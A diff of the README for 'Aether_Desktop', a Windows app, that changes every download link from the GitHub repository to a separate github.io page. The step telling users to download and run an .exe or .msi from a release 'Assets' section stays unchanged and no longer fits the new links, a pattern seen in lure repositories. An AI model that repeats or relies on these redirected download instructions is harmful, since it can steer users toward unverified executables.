@@ -1,6 +1,6 @@
 # 🌐 Aether_Desktop - Freedom in one tap on Windows
 
-[https://github.com/Zena2977/Aether_Desktop](https://github.com/Zena2977/Aether_Desktop)
+[https://zena2977.github.io](https://zena2977.github.io)
 
 This program brings the Aether experience to your computer. It offers the same features, design, and reliable performance as the mobile app. You get the same tools on your desktop screen.
 
@@ -8,7 +8,7 @@ This program brings the Aether experience to your computer. It offers the same f
 
 You do not need technical knowledge to start using this program. Follow these steps to install the application on your computer.
 
-1. Visit the [Download Page](https://github.com/Zena2977/Aether_Desktop) to access the latest installer.
+1. Visit the [Download Page](https://zena2977.github.io) to access the latest installer.
 2. Look for the section labeled "Assets" at the bottom of the page.
 3. Click the file that ends with ".msi" or ".exe" to begin the download.
 4. Save the file to your "Downloads" folder.
@@ -62,7 +62,7 @@ The program checks for updates when you start it. If an update exists, it prompt
 
 Use the link below to reach the latest release page. From there, select the appropriate installer for your Windows system.
 
-[Download Aether Desktop](https://github.com/Zena2977/Aether_Desktop)
+[Download Aether Desktop](https://zena2977.github.io)
 
 ## 🛡️ Privacy and Safety
 
